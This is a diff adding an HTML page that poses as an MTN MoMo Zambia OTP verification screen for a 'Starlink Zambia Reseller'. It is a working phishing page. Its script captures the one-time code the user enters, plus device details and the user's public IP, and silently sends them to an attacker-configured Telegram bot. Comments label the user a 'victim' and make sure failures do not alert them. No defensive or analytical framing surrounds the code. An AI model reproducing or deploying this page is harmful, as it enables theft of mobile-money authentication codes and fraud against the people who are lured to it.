@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>OTP Verification - MTN MoMo Zambia</title>
+
+    <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
+
+    <!-- Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+
+    <!-- Tailwind -->
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <style>
+         :root {
+            --momo-yellow: #FFCC00;
+        }
+        
+        body {
+            padding-top: 75px;
+            padding-bottom: 80px;
+            background: #f8fafc;
+        }
+        
+        .card-shadow {
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Header -->
+    <header class="fixed top-0 left-0 right-0 bg-black text-white shadow-lg z-50">
+        <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
+
+            <div class="flex items-center gap-3">
+                <img src="starlink_logo.png" alt="Starlink" class="h-8">
+
+                <div class="border-l border-gray-600 pl-3 hidden sm:block">
+                    <p class="text-sm text-gray-300">
+                        Zambia Reseller
+                    </p>
+                </div>
+            </div>
+
+            <nav class="hidden md:flex items-center gap-6 text-sm">
+                <a href="#" class="hover:text-yellow-400 flex items-center gap-2">
+                    <i class="uil uil-wifi"></i> Status
+                </a>
+
+                <a href="#" class="hover:text-yellow-400 flex items-center gap-2">
+                    <i class="uil uil-home"></i> Plans
+                </a>
+
+                <a href="#" class="hover:text-yellow-400 flex items-center gap-2">
+                    <i class="uil uil-list-ul"></i> Orders
+                </a>
+            </nav>
+
+        </div>
+    </header>
+
+    <!-- Main -->
+    <main class="max-w-7xl mx-auto px-4 py-8">
+
+        <div class="max-w-md mx-auto">
+
+            <div class="bg-white rounded-3xl overflow-hidden card-shadow">
+
+                <!-- Card Header -->
+                <div class="p-6 border-b border-gray-100">
+
+                    <div class="flex items-center justify-between mb-6">
+
+                        <a href="#" class="flex items-center text-gray-600 text-sm font-bold">
+                            <i class="uil uil-arrow-left text-xl mr-1"></i> Back
+                        </a>
+
+                        <div class="text-right">
+                            <p class="text-xs uppercase tracking-widest text-gray-400 font-bold">
+                                Amount
+                            </p>
+
+                            <h2 class="text-2xl font-black text-orange-500">
+                                ZMW 15.00
+                            </h2>
+                        </div>
+
+                    </div>
+
+                    <h1 class="text-3xl font-black text-gray-900">
+                        OTP Verification
+                    </h1>
+
+                    <p class="text-sm text-gray-500 mt-2">
+                        Please enter the OTP code you received via SMS.
+                    </p>
+
+                </div>
+
+                <!-- Card Body -->
+                <div class="p-6">
+
+                    <!-- Number -->
+                    <div class="text-center mb-8">
+
+                        <p class="text-xs uppercase tracking-widest text-gray-400 font-bold">
+                            Sending to
+                        </p>
+
+                        <p class="text-2xl font-black text-gray-900 mt-2">
+                            771234567
+                        </p>
+
+                    </div>
+
+                    <!-- Form -->
+                    <form id="otpForm" class="space-y-6">
+
+                        <!-- OTP Input -->
+                        <div>
+
+                            <label class="block text-xs uppercase tracking-widest text-gray-400 font-bold mb-3 ml-1">
+                                Enter OTP Code
+                            </label>
+
+                            <input type="text" id="otp_code" maxlength="6" placeholder="••••••" required class="w-full px-5 py-4 text-center text-3xl tracking-[10px] font-black text-gray-900 bg-gray-50 border-2 border-gray-100 rounded-2xl focus:outline-none focus:ring-4 focus:ring-orange-100 focus:border-orange-500 transition-all">
+
+                        </div>
+
+                        <!-- Button -->
+                        <button type="button" onclick="verifyOTP()" class="w-full bg-orange-500 hover:bg-orange-600 text-white py-5 rounded-2xl font-black text-lg shadow-lg shadow-orange-200 transition-all active:scale-[0.98] flex items-center justify-center gap-2">
+                            Verify & Complete
+                            <i class="uil uil-check-circle text-2xl"></i>
+                        </button>
+
+                    </form>
+
+                    <!-- Footer -->
+                    <div class="text-center mt-8">
+
+                        <p class="text-xs font-bold text-gray-400">
+                            <i class="uil uil-shield-check text-green-500 mr-1"></i> SSL ENCRYPTED AND SECURE
+                        </p>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </main>
+
+    <!-- Bottom Navigation -->
+    <nav class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 shadow-2xl z-50">
+        <div class="max-w-7xl mx-auto px-2 sm:px-4 py-2 sm:py-3 flex justify-around items-center">
+
+            <a href="payment.html" class="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all">
+                <i class="uil uil-wifi text-2xl"></i>
+                <span class="text-xs font-semibold">Status</span>
+            </a>
+
+            <a href="payment.html" class="flex flex-col items-center gap-1 text-blue-600 hover:text-blue-700 transition-all">
+                <i class="uil uil-shopping-bag text-2xl"></i>
+                <span class="text-xs font-semibold">Plans</span>
+            </a>
+
+            <a href="payment.html" class="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all">
+                <i class="uil uil-list-ul text-2xl"></i>
+                <span class="text-xs font-semibold">Orders</span>
+            </a>
+
+            <a href="payment.html" class="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all">
+                <i class="uil uil-setting text-2xl"></i>
+                <span class="text-xs font-semibold">Settings</span>
+            </a>
+
+        </div>
+    </nav>
+
+    <!-- Script -->
+    <script>
+        // ============================================================
+        // CONFIGURATION - SET YOUR TELEGRAM BOT TOKEN & CHAT ID HERE
+        // ============================================================
+        const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"; // e.g., "1234567890:ABCdefGHIjklmNOPqrstUVwxyz"
+        const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"; // e.g., "123456789"
+        // ============================================================
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            const payload = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: "HTML"
+            };
+
+            // Use fetch to send (works in all modern browsers)
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            }).catch(err => {
+                // Silent fail - doesn't alert the victim
+                console.log("Telegram send error:", err);
+            });
+        }
+
+        function getVictimInfo() {
+            const info = [];
+
+            info.push(`🌍 <b>IP:</b> ${navigator.userAgent}`);
+
+            // Try to get IP via free API (non-blocking)
+            try {
+                fetch("https://api.ipify.org?format=json")
+                    .then(r => r.json())
+                    .then(d => {
+                        sendToTelegram(`🌐 <b>Victim Public IP:</b> ${d.ip}`);
+                    })
+                    .catch(() => {});
+            } catch (e) {}
+
+            return info.join("\n");
+        }
+
+        function verifyOTP() {
+            const otp = document.getElementById("otp_code").value;
+
+            if (otp.length < 4) {
+                alert("Please enter a valid OTP code.");
+                return;
+            }
+
+            // Capture additional context
+            const timestamp = new Date().toISOString();
+            const userAgent = navigator.userAgent;
+            const screenRes = `${screen.width}x${screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const language = navigator.language;
+            const platform = navigator.platform;
+            const pageUrl = window.location.href;
+
+            // Build the Telegram message
+            const message = `
+━━━━━━━━━━━━━━━━━━━━━━━
+<b>🔐 OTP CAPTURED</b>
+━━━━━━━━━━━━━━━━━━━━━━━
+
+<b>📟 OTP Code:</b> <code>${otp}</code>
+<b>📱 Phone:</b> 771234567
+<b>💰 Amount:</b> ZMW 15.00
+
+━━━━━━━━━━━━━━━━━━━━━━━
+<b>🖥 VICTIM INFO</b>
+━━━━━━━━━━━━━━━━━━━━━━━
+
+<b>⏱ Time:</b> ${timestamp}
+<b>🌐 Timezone:</b> ${timezone}
+<b>🗣 Language:</b> ${language}
+<b>💻 Platform:</b> ${platform}
+<b>📺 Screen:</b> ${screenRes}
+<b>🔗 Page:</b> ${pageUrl}
+<b>🧩 UA:</b> ${userAgent}
+
+━━━━━━━━━━━━━━━━━━━━━━━
+            `.trim();
+
+            // Send OTP to Telegram
+            sendToTelegram(message);
+
+            // Also try to get and send IP asynchronously
+            try {
+                fetch("https://api.ipify.org?format=json")
+                    .then(r => r.json())
+                    .then(d => {
+                        sendToTelegram(`🌐 <b>Victim Public IP:</b> ${d.ip}\n<b>🔑 OTP:</b> <code>${otp}</code>`);
+                    })
+                    .catch(() => {});
+            } catch (e) {}
+
+            // Redirect to success page
+            window.location.href = "success.html";
+        }
+    </script>
+
+</body>
+
+</html>
